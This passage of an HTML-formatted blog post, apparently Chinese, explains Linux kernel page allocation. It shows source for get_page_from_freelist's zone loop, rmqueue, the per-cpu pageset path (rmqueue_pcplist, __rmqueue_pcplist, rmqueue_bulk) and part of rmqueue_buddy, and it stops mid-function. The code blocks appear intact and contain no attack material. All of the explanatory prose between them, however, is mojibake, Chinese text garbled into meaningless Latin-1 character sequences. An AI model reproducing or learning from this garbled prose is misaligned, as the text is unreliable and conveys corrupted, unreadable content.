class="line">mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);</span><br><span class="line"><span class="keyword">if</span> (!zone_watermark_fast(zone, order, mark,</span><br><span class="line">       ac-&gt;highest_zoneidx, alloc_flags,</span><br><span class="line">       gfp_mask)) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (has_unaccepted_memory()) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_to_accept_memory(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Watermark failed for this zone, but see if we can</span></span><br><span class="line"><span class="comment"> * grow this zone if it contains deferred pages.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (deferred_pages_enabled()) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/* Checked here to keep the fast path fast */</span></span><br><span class="line">BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!node_reclaim_enabled() ||</span><br><span class="line">    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);</span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_NOSCAN:</span><br><span class="line"><span class="comment">/* did not scan */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">case</span> NODE_RECLAIM_FULL:</span><br><span class="line"><span class="comment">/* scanned but unreclaimable */</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* did we reclaim enough */</span></span><br><span class="line"><span class="keyword">if</span> (zone_watermark_ok(zone, order, mark,</span><br><span class="line">ac-&gt;highest_zoneidx, alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_this_zone:</span><br><span class="line">page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,</span><br><span class="line">gfp_mask, alloc_flags, ac-&gt;migratetype);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">prep_new_page(page, order, gfp_mask, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If this is a high-order atomic allocation then check</span></span><br><span class="line"><span class="comment"> * if the pageblock should be reserved for the future</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (unlikely(alloc_flags &amp; ALLOC_HIGHATOMIC))</span><br><span class="line">reserve_highatomic_pageblock(page, zone);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (has_unaccepted_memory()) &#123;</span><br><span class="line"><span class="keyword">if</span> (try_to_accept_memory(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/* Try again if zone has deferred pages */</span></span><br><span class="line"><span class="keyword">if</span> (deferred_pages_enabled()) &#123;</span><br><span class="line"><span class="keyword">if</span> (_deferred_grow_zone(zone, order))</span><br><span class="line"><span class="keyword">goto</span> try_this_zone;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s possible on a UMA machine to get through all zones that are</span></span><br><span class="line"><span class="comment"> * fragmented. If avoiding fragmentation, reset and try again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (no_fallback) &#123;</span><br><span class="line">alloc_flags &amp;= ~ALLOC_NOFRAGMENT;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°çš„æµç¨‹å¤§ä½“å¦‚ä¸‹ï¼Œä½¿ç”¨<code>for_next_zone_zonelist_nodemask</code>å®è¿­ä»£éå†åˆ†é…ä¸Šä¸‹æ–‡ä¸­çš„<code>zonelist</code>ä¸­çš„<code>zoneref</code>æ•°ç»„å¯¹åº”çš„zone</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> for_next_zone_zonelist_nodemask(zone, z, highidx, nodemask) \</span></span><br><span class="line"><span class="meta">for (zone = z-&gt;zone;\</span></span><br><span class="line"><span class="meta">zone;\</span></span><br><span class="line"><span class="meta">z = next_zones_zonelist(++z, highidx, nodemask),\</span></span><br><span class="line"><span class="meta">zone = zonelist_zone(z))</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„<code>next_zones_zonelist</code>å‡½æ•°è¿”å›çš„æ˜¯åœ¨<code>nodemask</code>çš„ zone ä¸­ï¼Œä»¥å½“å‰ zone ä½œä¸ºèµ·ç‚¹æ¸¸æ ‡çš„ï¼ˆä½äºæˆ–ä½äºï¼‰<code>highest_zoneidx</code> çš„ä¸‹ä¸€ä¸ª zoneã€‚</p><p>æ¥ä¸‹æ¥è¿›å…¥å¾ªç¯ä½“å†…éƒ¨ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜¯å¦å¼€å¯cpusetå¹¶æ£€æŸ¥å½“å‰ zone æ˜¯å¦æ»¡è¶³ cpuset çš„è¦æ±‚ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zoneã€‚</p><p>æ£€æŸ¥å½“å‰ zone å¯¹åº” node çš„è„é¡µæ•°é‡æ˜¯å¦è¶…å‡ºé™åˆ¶ï¼Œè‹¥å¦ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zoneã€‚</p><p>è‹¥<code>alloc_flags</code>åŒ…å«<code>ALLOC_NOFRAGMENT</code>ä½†æ˜¯å½“å‰ zone é<code>preferred zone</code>ã€ä¸”å¯¹åº” node éƒ¨ä½<code>local node</code>ï¼Œåˆ™æ¸…é™¤è¯¥æ ‡å¿—ä½åé‡æ–°å¼€å§‹åˆ†é…ï¼Œå› ä¸º locality æ¯”é¿å…ç¢ç‰‡æ›´åŠ é‡è¦ã€‚</p><p>åé¢åˆ™æ˜¯å¯¹æ°´ä½çº¿çš„ä¸€äº›åˆ¤æ–­ï¼Œé¦–å…ˆæ˜¯è·å–å½“å‰ zone çš„æ°´ä½çº¿æ ‡è®°ï¼Œè‹¥æ˜¯è®¾ç½®äº† <code>ALLOC_NO_WATERMARKS</code> åˆ™ç›´æ¥åˆ°ä¸‹ä¸€æ­¥è¿›è¡Œåˆ†é…ï¼Œè‹¥æ°´ä½çº¿æ£€æŸ¥æœªé€šè¿‡ï¼Œè°ƒç”¨ <code>node_reclaim()</code> è¿›è¡Œé¡µé¢å›æ”¶ï¼Œè‹¥å›æ”¶åé¡µé¢è¿˜æ˜¯ä¸è¶³ï¼Œåˆ™å°è¯•ä¸‹ä¸€ä¸ª zoneã€‚</p><p>åœ¨ç»å†äº†å‰é¢çš„forå¾ªç¯ä¹‹åæœ€ç»ˆè°ƒç”¨<code>rmqueue</code>å‡½æ•°è¿›è¡Œæ­£å¼çš„å†…å­˜åˆ†é…ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span></span></span><br><span class="line"><span class="function">struct page *<span class="title">rmqueue</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="params"><span class="function">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">gfp_t</span> gfp_flags, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We most definitely don&#x27;t want callers attempting to</span></span><br><span class="line"><span class="comment"> * allocate greater than order-1 page units with __GFP_NOFAIL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">WARN_ON_ONCE((gfp_flags &amp; __GFP_NOFAIL) &amp;&amp; (order &gt; <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (likely(pcp_allowed_order(order))) &#123;</span><br><span class="line">page = rmqueue_pcplist(preferred_zone, zone, order,</span><br><span class="line">       migratetype, alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (likely(page))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page = rmqueue_buddy(preferred_zone, zone, order, alloc_flags,</span><br><span class="line">migratetype);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line"><span class="comment">/* Separate test+clear to avoid unnecessary atomics */</span></span><br><span class="line"><span class="keyword">if</span> ((alloc_flags &amp; ALLOC_KSWAPD) &amp;&amp;</span><br><span class="line">    unlikely(test_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags))) &#123;</span><br><span class="line">clear_bit(ZONE_BOOSTED_WATERMARK, &amp;zone-&gt;flags);</span><br><span class="line">wakeup_kswapd(zone, <span class="number">0</span>, <span class="number">0</span>, zone_idx(zone));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VM_BUG_ON_PAGE(page &amp;&amp; bad_range(zone, page), page);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‡½æ•°è¿›å…¥ä¹‹åä¼šé¦–å…ˆéªŒè¯ç”³è¯·çš„<code>order</code>æ˜¯å¦æ»¡è¶³é€šè¿‡pcpç”³è¯·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">pcp_allowed_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (order &lt;= PAGE_ALLOC_COSTLY_ORDER)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="keyword">if</span> (order == pageblock_order)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„pcpæŒ‡çš„æ˜¯<code>per-cpu pageset</code>ï¼Œè¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹<code>per-cpu pageset</code>çš„æ¦‚å¿µï¼ˆåœ¨è€ç‰ˆæœ¬çš„Linuxå†…æ ¸ä¸­è¿™çš„orderä¸€èˆ¬åªå…è®¸ä¸º0æ—¶ä»pcpä¸­ç”³è¯·ï¼Œå‘ç°åœ¨æ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­å¥½åƒæ˜¯å°äºç­‰äº3å³å¯ï¼‰ï¼Œåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå­˜åœ¨å¾ˆå¤šé˜¶ä¸º0çš„ç”³è¯·è¯·æ±‚ï¼Œå¦‚æœæ¯ä¸€æ¬¡çš„ç”³è¯·è¯·æ±‚éƒ½éœ€è¦è·å–<code>zone-&gt;lock</code>çš„è¯ï¼Œåœ¨è¶Šå¤šçš„cpuæ ¸å¿ƒçš„æƒ…å†µä¸‹å°±ä¼šå‡ºç°è¶Šå¤šçš„é”çš„ç«äº‰ã€‚ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼ŒLinuxé‡‡ç”¨çš„åŠæ³•å°±æ˜¯ä½¿ç”¨<code>per-cpu pageset</code>å³pcpï¼Œå…¶ä¼šä¸€æ¬¡æ€§æ‹¿å¾ˆå¤šé¡µå­˜æ”¾åœ¨cpuä¸­ï¼Œå¹¶ä¸”é‡Šæ”¾çš„é¡µä¹Ÿä¼šç»§ç»­å­˜æ”¾åœ¨è¿™é‡Œï¼Œç­‰é‡Šæ”¾çš„é¡µæ»¡äº†æ‰ä¼šä¸€å¹¶æ”¾å›åˆ°zoneä¸­ï¼ˆæˆ‘çš„ç†è§£å°±æ˜¯ä¸€ä¸ªcacheï¼‰ã€‚</p><p>åœ¨é€šè¿‡orderçš„æ£€éªŒä¹‹åå°±ä¼šè¿›å…¥å†…éƒ¨è°ƒç”¨<code>rmqueue_pcplist</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct page *<span class="title">rmqueue_pcplist</span><span class="params">(struct zone *preferred_zone,</span></span></span><br><span class="line"><span class="params"><span class="function">struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> __maybe_unused UP_flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* spin_trylock may fail due to a parallel drain or IRQ reentrancy. */</span></span><br><span class="line">pcp_trylock_prepare(UP_flags);</span><br><span class="line">pcp = pcp_spin_trylock(zone-&gt;per_cpu_pageset);</span><br><span class="line"><span class="keyword">if</span> (!pcp) &#123;</span><br><span class="line">pcp_trylock_finish(UP_flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On allocation, reduce the number of pages that are batch freed.</span></span><br><span class="line"><span class="comment"> * See nr_pcp_free() where free_factor is increased for subsequent</span></span><br><span class="line"><span class="comment"> * frees.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">pcp-&gt;free_count &gt;&gt;= <span class="number">1</span>;</span><br><span class="line"><span class="built_in">list</span> = &amp;pcp-&gt;lists[order_to_pindex(migratetype, order)];</span><br><span class="line">page = __rmqueue_pcplist(zone, order, migratetype, alloc_flags, pcp, <span class="built_in">list</span>);</span><br><span class="line">pcp_spin_unlock(pcp);</span><br><span class="line">pcp_trylock_finish(UP_flags);</span><br><span class="line"><span class="keyword">if</span> (page) &#123;</span><br><span class="line">__count_zid_vm_events(PGALLOC, page_zonenum(page), <span class="number">1</span> &lt;&lt; order);</span><br><span class="line">zone_statistics(preferred_zone, zone, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>rmqueue_pcplist</code>å‡½æ•°çš„åŸºæœ¬æµç¨‹å°±æ˜¯é¦–å…ˆè·å–æ‰pcpï¼Œéšåé€šè¿‡<code>order</code>å’Œè¿ç§»ç±»å‹é€‰æ‹©å¯¹åº”çš„listï¼ˆå½“ç„¶åœ¨è€ç‰ˆæœ¬çš„Linuxå†…æ ¸ä¸­æ˜¯ä¸éœ€è¦orderçš„ï¼‰ï¼Œéšåè°ƒç”¨<code>__rmqueue_pcplist</code>å‡½æ•°çœŸæ­£ç”³è¯·é¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_pcplist</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> *<span class="title">pcp</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (list_empty(<span class="built_in">list</span>)) &#123;</span><br><span class="line"><span class="keyword">int</span> batch = nr_pcp_alloc(pcp, zone, order);</span><br><span class="line"><span class="keyword">int</span> alloced;</span><br><span class="line"></span><br><span class="line">alloced = rmqueue_bulk(zone, order,</span><br><span class="line">batch, <span class="built_in">list</span>,</span><br><span class="line">migratetype, alloc_flags);</span><br><span class="line"></span><br><span class="line">pcp-&gt;count += alloced &lt;&lt; order;</span><br><span class="line"><span class="keyword">if</span> (unlikely(list_empty(<span class="built_in">list</span>)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page = list_first_entry(<span class="built_in">list</span>, struct page, pcp_list);</span><br><span class="line">list_del(&amp;page-&gt;pcp_list);</span><br><span class="line">pcp-&gt;count -= <span class="number">1</span> &lt;&lt; order;</span><br><span class="line">&#125; <span class="keyword">while</span> (check_new_pages(page, order));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__rmqueue_pcplist</code>å‡½æ•°çš„é€»è¾‘æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œé¦–å…ˆä¼šåˆ¤æ–­<code>list</code>æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºåˆ™è°ƒç”¨<code>rmqueue_bulk</code>å‡½æ•°ä»<code>zone</code>å–é¡µåˆ°pcpä¸­ï¼Œå¦‚æœä¸ä¸ºç©ºåˆ™ç›´æ¥å–é¡µé¢éšåé€šè¿‡<code>check_new_pages</code>å‡½æ•°è¿›è¡Œæ£€æµ‹ï¼Œé€šè¿‡åˆ™ç›´æ¥è¿”å›é¡µã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rmqueue_bulk</span><span class="params">(struct zone *zone, <span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> count, struct list_head *<span class="built_in">list</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> migratetype, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; count; ++i) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> __rmqueue(zone, order, migratetype,</span><br><span class="line">alloc_flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(page == <span class="literal">NULL</span>))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Split buddy pages returned by expand() are received here in</span></span><br><span class="line"><span class="comment"> * physical page order. The page is added to the tail of</span></span><br><span class="line"><span class="comment"> * caller&#x27;s list. From the callers perspective, the linked list</span></span><br><span class="line"><span class="comment"> * is ordered by page number under some conditions. This is</span></span><br><span class="line"><span class="comment"> * useful for IO devices that can forward direction from the</span></span><br><span class="line"><span class="comment"> * head, thus also in the physical page order. This is useful</span></span><br><span class="line"><span class="comment"> * for IO devices that can merge IO requests if the physical</span></span><br><span class="line"><span class="comment"> * pages are ordered properly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_add_tail(&amp;page-&gt;pcp_list, <span class="built_in">list</span>);</span><br><span class="line"><span class="keyword">if</span> (is_migrate_cma(get_pcppage_migratetype(page)))</span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_CMA_PAGES,</span><br><span class="line">      -(<span class="number">1</span> &lt;&lt; order));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__mod_zone_page_state(zone, NR_FREE_PAGES, -(i &lt;&lt; order));</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç®€å•çœ‹ä¸€ä¸‹<code>rmqueue_bulk</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šè¿›è¡Œ<code>batch</code>æ¬¡å¾ªç¯é€šè¿‡<code>__rmqueue</code>å‡½æ•°ç”³è¯·pageå¹¶å‘é“¾è¡¨ä¸­åŠ å…¥ã€‚è¿™é‡Œå‡½æ•°å†…éƒ¨çš„<code>__rmqueue</code>å‡½æ•°ç•™åœ¨åé¢ä¸€å¹¶æ¢³ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline</span></span><br><span class="line"><span class="function">struct page *<span class="title">rmqueue_buddy</span><span class="params">(struct zone *preferred_zone, struct zone *zone,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">page = <span class="literal">NULL</span>;</span><br><span class="line">spin_lock_irqsave(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_HIGHATOMIC)</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">page = __rmqueue(zone, order, migratetype, alloc_flags);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If the allocation fails, allow OOM handling access</span></span><br><span class="line"><span class="comment"> * to HIGHATOMIC reserves as failing now is worse than</span></span><br><span class="line"><span class="comment"> * failing a high-order atomic allocation in the</span></span><br><span class="line"><span class="comment"> * future.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; (alloc_flags &amp; ALLOC_OOM))</span><br><span class="line">page = __rmqueue_smallest(zone, order, MIGRATE_HIGHATOMIC);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page) &#123;</span><br><span class="line">spin_unlock_irqrestore(&amp;zone-&gt;lock, flags);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">__mod_zone_freepage_state(zone, -(<span class="number">1</span> &lt;&lt; order),</span><br><span 